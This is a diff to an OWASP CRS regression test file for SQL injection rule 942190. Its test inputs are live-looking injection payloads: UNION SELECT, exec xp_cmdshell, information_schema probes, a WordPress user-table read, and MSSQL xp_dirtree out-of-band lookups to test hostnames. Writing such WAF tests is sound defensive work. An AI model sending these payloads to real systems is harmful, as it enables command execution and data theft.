@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "Christian S.J. Peron, Christoph Hansen"
+  author: "Christian S.J. Peron, Christoph Hansen, Franziska Bühler"
   description: None
   enabled: true
   name: 942190.yaml
@@ -13,8 +13,12 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: GET
             port: 80
+            # uri: "/?var=%22%20sleep%281234%22" #triggers 942150 942410 too
+            # uri: "/?var=\" sleep(120\""  # triggers 942330
             # NB: match with %20 but no bare byte match?
             uri: "/?var=%20exec%20xp_cmdshell"
             version: HTTP/1.0
@@ -28,6 +32,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -43,10 +49,12 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
-            data: "%22+union+s%0A"
+            data: "%22+union+select%0A"
             version: HTTP/1.0
           output:
             log_contains: id "942190"
@@ -58,6 +66,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -73,6 +83,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -88,6 +100,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -103,6 +117,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -118,10 +134,12 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
-            data: "%27union%2F%0A"
+            data: "%27union%20select%2F%0A"
             version: HTTP/1.0
           output:
             log_contains: id "942190"
@@ -133,10 +151,12 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
-            data: "from%2F%2A%2A%2Finformation_schema.%0A"
+            data: "from+information_schema.%0A"
             version: HTTP/1.0
           output:
             log_contains: id "942190"
@@ -148,6 +168,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -163,6 +185,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -178,6 +202,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -193,6 +219,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -208,6 +236,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -223,6 +253,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -238,6 +270,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -253,6 +287,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -268,6 +304,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -283,10 +321,12 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
-            data: "FROM%2F%2A%2A%2FINFORMATION_SCHEMA.%0A"
+            data: "FROM+INFORMATION_SCHEMA.%0A"
             version: HTTP/1.0
           output:
             log_contains: id "942190"
@@ -298,6 +338,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -313,6 +355,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -328,6 +372,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -343,6 +389,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -358,6 +406,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -373,6 +423,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -388,6 +440,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -403,6 +457,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -418,6 +474,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -433,6 +491,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -448,10 +508,12 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
-            data: "%22+UNION+A%0A"
+            data: "%22%20UNION%20ALL%20SELECT%0A"
             version: HTTP/1.0
           output:
             log_contains: id "942190"
@@ -463,10 +525,12 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
-            data: "EXec%2F%2A%2A%2Fxp_cmdshell%0A"
+            data: "EXec+xp_cmdshell%0A"
             version: HTTP/1.0
           output:
             log_contains: id "942190"
@@ -478,10 +542,12 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
-            data: "FrOM%2F%2A%2A%2Finformation_schema.%0A"
+            data: "FrOM+information_schema.%0A"
             version: HTTP/1.0
           output:
             log_contains: id "942190"
@@ -493,6 +559,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -508,6 +576,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -523,6 +593,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -538,6 +610,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -553,6 +627,8 @@ tests:
             dest_addr: 127.0.0.1
             headers:
               Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
             method: POST
             port: 80
             uri: "/"
@@ -560,3 +636,156 @@ tests:
             version: HTTP/1.0
           output:
             log_contains: id "942190"
+  - test_title: 942190-38
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=1);declare @q varchar(99);set @q='\\\\j0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule' 'set.org\\kph'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-39
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=content.ini);declare @q varchar(99);set @q='\\\\i1kvc9uwkehiqzrt4hcnovpublhunittests.corerule' 'set.org\\lri'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-40
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=EmptyValue', '4', '2', '7');declare @q varchar(99);set @q='\\\\h5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\\vcr'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-41
+    desc: "MSSQL Code Execution and Information gathering attempts"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=test));declare @q varchar(99);set @q='\\\\zwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\\gej'; exec master.dbo.xp_dirtree @q;--"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-42
+    desc: "MySQL SQLi using set variable"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "id=@.:=right(right((select+user_login+from+wordpress.wp_users+limit+1,1),1111),1111)+union%23%0adistinctrow%0bselect@."
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-43
+    desc: "False positive UNION #2047"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "arg=Die%20%22Union%20von%20Europa%22"
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "942190"
+  - test_title: 942190-44
+    desc: "MSSQL Logical Functions - IIF (Transact-SQL) - regression test"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "arg=SELECT%20IIF(1%20%3E%201%2C%20'TRUE'%2C%20'FALSE'%20)"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942190"
+  - test_title: 942190-45
+    desc: "False positive IIF"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "arg=it%20is%20my%20beliif%20%28stemming%20from%20personal%20experience%29%2C%20that"
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "942190"
+  - test_title: 942190-46
+    desc: "False positive (word boundary)"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            data: "arg=appUser(sitename,user)"
+            version: HTTP/1.0
+          output:
+            no_log_contains: id "942190"
